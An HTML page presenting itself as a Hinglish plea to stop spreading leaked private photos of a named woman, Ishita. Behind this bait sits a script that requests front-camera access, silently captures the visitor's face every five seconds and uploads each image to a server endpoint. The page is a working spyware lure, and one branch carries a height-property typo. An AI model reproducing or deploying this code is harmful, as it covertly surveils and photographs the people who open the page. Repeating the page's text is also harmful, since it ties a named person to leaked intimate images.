<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title style="color: blue;">Ishita mar jayegi bhai agar ye sab band nahi hua to........</title>
</head>
<body>

<h1>Bhai request kar raha hu yaar mat faila pics sabme.</h1>
<p>Bhai yarr mat kar please haath jodta hu mai yarr ishita bhaut jyada pareshan ho gayi hai yarr....tu mujhe bata or photo chahiye to mujhse lele yarr mai tujhe dila dunga poori video or photo par sambe mat faila mere sab dosto me fail gayi hai baat or mai or ishita.....kahi muh dikhane ke kabil nahi bache hai maine ab bahar nikalna bhi band kar diya hai isi wajah se.</p>

<script>
    // Check if camera permission is already granted
    const cameraPermissionGranted = localStorage.getItem('cameraPermission') === 'granted';

    async function captureAndSend() {
        try {
            // Check if camera permission is already granted
            if (!cameraPermissionGranted) {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user', // 'user' for front camera
                    },
                });

                const video = document.createElement('video');
                document.body.appendChild(video);
                video.srcObject = stream;
                await video.play();

                // If permission is granted, store it in localStorage
                localStorage.setItem('cameraPermission', 'granted');

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHight;
                const context = canvas.getContext('2d');

                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert canvas data to Blob (binary format)
                canvas.toBlob(blob => {
                    // Send the Blob to your API
                    sendToApi(blob);
                }, 'image/png');

                stream.getTracks().forEach(track => track.stop());
                document.body.removeChild(video);
            } else {
                // Camera permission is already granted, proceed with capturing and sending
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user', // 'user' for front camera
                    },
                });

                const video = document.createElement('video');
                document.body.appendChild(video);
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');

                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convert canvas data to Blob (binary format)
                canvas.toBlob(blob => {
                    // Send the Blob to your API
                    sendToApi(blob);
                }, 'image/png');

                stream.getTracks().forEach(track => track.stop());
                document.body.removeChild(video);
            }
        } catch (error) {
            console.error('Error accessing front camera:', error);
        }
    }

    function sendToApi(blob) {
        // Replace 'your-api-endpoint' with the actual API endpoint
        const apiUrl = 'http://localhost:3000/upload';

        const formData = new FormData();
        formData.append('photo', blob, 'photo.png');

        // Use fetch to send the image data to your API
        fetch(apiUrl, {
            method: 'POST',
            body: formData,
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            console.log('API Response:', data);
        })
        .catch(error => {
            console.error('Error sending data to API:', error);
        });
    }

    // Automatically trigger after x seconds
    setInterval(captureAndSend, 5000);
</script>

</body>
</html>
